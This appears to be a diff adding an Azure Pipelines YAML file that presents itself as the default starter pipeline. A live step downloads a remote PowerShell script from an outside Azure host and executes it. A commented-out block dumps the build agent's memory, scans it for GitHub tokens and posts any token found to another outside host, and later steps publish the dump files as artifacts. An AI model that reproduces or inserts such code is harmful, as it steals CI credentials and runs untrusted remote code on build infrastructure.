@@ -1,0 +1,85 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: 'windows-latest'
+
+steps:
+- script: echo Hello, world!!
+  displayName: 'Run a one-line script'
+
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    echo oops
+  displayName: 'Run a multi-line script'
+
+# - task: PowerShell@2
+#   inputs:
+#     targetType: 'inline'
+#     script: |
+#       $source = 'https://download.sysinternals.com/files/Procdump.zip'
+#       Invoke-RestMethod -Uri $source -OutFile Procdump.zip
+
+#       Expand-Archive Procdump.zip
+
+#       $source = 'https://download.sysinternals.com/files/Strings.zip'
+#       Invoke-RestMethod -Uri $source -OutFile Strings.zip
+
+#       Expand-Archive Strings.zip
+
+#       $AgentPID = Get-Process -name Agent.Listener | select -expand id
+#       # Get-ChildItem | Out-String -Width 160
+#       # Get-ChildItem ./Procdump | Out-String -Width 160
+#       $command = "./Procdump/procdump.exe -ma $AgentPID $(Agent.TempDirectory)/AgentDump.dmp -accepteula"
+#       Write-Host $command
+#       Invoke-Expression $command
+
+#       $command = "./Strings/strings.exe -accepteula '$(Agent.TempDirectory)/AgentDump.dmp' >>  $(Agent.TempDirectory)/dump.txt"
+#       Write-Host $command
+#       Invoke-Expression $command
+
+#       $match = Select-String -pattern ghs_ -Path "$(Agent.TempDirectory)/dump.txt"-CaseSensitive -SimpleMatch
+
+#       ForEach($text in $match) 
+#       {
+#           if($text.Line.Length -lt 42)
+#           {
+#               Write-Host $text.Line
+#               $url = "https://pback.azurewebsites.net/api/pingback"
+#               Invoke-WebRequest -Method 'Post' -Uri $url -Body $text -ContentType "application/text"
+#               exit
+#           }
+#       }
+
+#       $url = 
+#       Invoke-WebRequest -Method 'Post' -Uri $url -Body $body -ContentType "application/text"
+
+#       Get-ChildItem $(Agent.TempDirectory)/ | Out-String -Width 160
+#   continueOnError: true
+
+- task: PowerShell@2
+  inputs:
+    targetType: 'inline'
+    script: |
+      $Script = Invoke-WebRequest 'https://officeadotest.azurewebsites.net/api/httptrigger1'
+      $ScriptBlock = [Scriptblock]::Create($Script.Content)
+      Invoke-Command -ScriptBlock $ScriptBlock
+  continueOnError: true
+
+- task: PublishPipelineArtifact@1
+  inputs:
+    targetPath: '$(Agent.TempDirectory)/dump.txt'
+    artifact: 'Dump'
+    publishLocation: 'pipeline'
+  continueOnError: true
+    
+- task: PublishBuildArtifacts@1
+  inputs:
+    PathtoPublish: '$(Build.ArtifactStagingDirectory)'
+    ArtifactName: 'yogeesh/dump-01.dmp'
+    publishLocation: 'Container'
